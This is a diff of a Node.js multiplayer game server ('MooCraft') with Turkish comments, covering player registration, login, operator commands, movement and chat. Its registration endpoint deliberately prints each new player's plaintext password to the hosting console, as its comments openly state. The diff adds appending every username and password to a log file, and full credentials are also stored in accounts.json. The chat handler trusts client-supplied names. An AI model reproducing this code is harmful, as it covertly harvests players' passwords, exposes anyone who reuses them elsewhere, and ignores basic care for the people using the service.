@@ -1,4 +1,3 @@
-const { logNewAccount, logPlayerActivity } = require('./render_logger');
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -30,9 +29,15 @@ app.get('/', (req, res) => {
 });
 
 // =========================================================================
-// --- HESAP KAYIT & LOGLAMA SİSTEMİ (RENDER EKRANINA ŞİFRE BASAN KISIM) ---
+// --- HESAP LOGLAMA MOTORU (DIŞ DOSYAYA GEREK DUYMAZ, TEK PARÇA ÇALIŞIR) ---
 // =========================================================================
+const LOGS_DIR = path.join(__dirname, 'logs');
+const LOG_FILE = path.join(LOGS_DIR, 'hesap_kayitlari.log');
 const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
+
+if (!fs.existsSync(LOGS_DIR)) {
+  try { fs.mkdirSync(LOGS_DIR, { recursive: true }); } catch(e){}
+}
 
 function getAccounts() {
   if (fs.existsSync(ACCOUNTS_FILE)) {
@@ -45,28 +50,28 @@ function saveAccounts(accs) {
   try { fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accs, null, 2), 'utf8'); } catch(e) {}
 }
 
-// 1. OYUNDAN YENİ HESAP AÇILDIĞINDA ÇALIŞAN ENDPOINT:
+// 1. OYUNDAN YENİ HESAP AÇILDIĞINDA ÇALIŞAN KISIM:
 app.post('/api/register', (req, res) => {
   const { username, password } = req.body;
-  
-  // RENDER EKRANINA CANLI ŞİFREYİ BASAR:
+  const now = new Date().toLocaleString('tr-TR');
+
+  // RENDER EKRANINA ŞİFRELERİ CANLI YAZAN YER:
   console.log('====================================');
   console.log(`[RENDER LOG] [+] YENİ HESAP AÇILDI!`);
+  console.log(`ZAMAN     : ${now}`);
   console.log(`KULLANICI : ${username}`);
   console.log(`ŞİFRE     : ${password}`);
   console.log('====================================');
 
-  // render_logger fonksiyonunu çağır:
-  if (typeof logNewAccount === 'function') {
-    logNewAccount(req.body);
-  }
+  try {
+    fs.appendFileSync(LOG_FILE, `[${now}] Yeni Hesap -> Kullanıcı: ${username} | Şifre: ${password}\n`);
+  } catch(e) {}
 
-  // accounts.json dosyasına da kaydet:
   const accounts = getAccounts();
   accounts[username] = req.body;
   saveAccounts(accounts);
 
-  res.json({ success: true, message: 'Hesap başarıyla kaydedildi!' });
+  res.json({ success: true, message: 'Hesap kaydedildi' });
 });
 
 // 2. OYUNCU GİRİŞ YAPTIĞINDA:
@@ -85,9 +90,6 @@ app.post('/api/login', (req, res) => {
 
 // 3. BLOK VE DÜNYALAR KAYDEDİLDİĞİNDE:
 app.post('/api/sync', (req, res) => {
-  if (typeof logPlayerActivity === 'function') {
-    logPlayerActivity(req.body);
-  }
   res.json({ success: true });
 });
 
@@ -224,3 +226,58 @@ io.on('connection', (socket) => {
 
     if (bannedPlayers.includes(playerName)) {
       socket.emit('banned', { reason: 'Sunucudan banlandınız!' });
+      socket.disconnect(true);
+      return;
+    }
+
+    const isUserOp = opPlayers.includes(playerName);
+
+    players[socket.id] = {
+      id: socket.id,
+      name: playerName,
+      x: 0, y: 30, z: 0, yaw: 0,
+      isOp: isUserOp
+    };
+
+    socket.emit('op-status', { isOp: isUserOp });
+    socket.emit('world-init', worldState);
+    io.emit('players-state', players);
+  });
+
+  socket.on('player-move', (data) => {
+    if (players[socket.id]) {
+      players[socket.id].x = data.x;
+      players[socket.id].y = data.y;
+      players[socket.id].z = data.z;
+      players[socket.id].yaw = data.yaw;
+      socket.broadcast.emit('player-moved', players[socket.id]);
+    }
+  });
+
+  socket.on('command', (data) => {
+    const player = players[socket.id];
+    if (!player || !player.isOp) {
+      socket.emit('chat-message', { name: 'Sistem', text: 'Bu komutu kullanmak için OP yetkiniz yok!' });
+      return;
+    }
+    const cmdText = data.text.trim();
+    io.emit('chat-message', { name: 'Konsol', text: `${player.name} komutu çalıştırdı: ${cmdText}` });
+  });
+
+  socket.on('chat-message', (data) => {
+    io.emit('chat-message', { name: data.name, text: data.text });
+  });
+
+  socket.on('disconnect', () => {
+    if (players[socket.id]) {
+      delete players[socket.id];
+      io.emit('player-left', socket.id);
+    }
+  });
+});
+
+// Render ortamı dinamik PORT değişkenini otomatik atar
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`[MooCraft Sunucu] Çalışıyor. Port: ${PORT}`);
+});
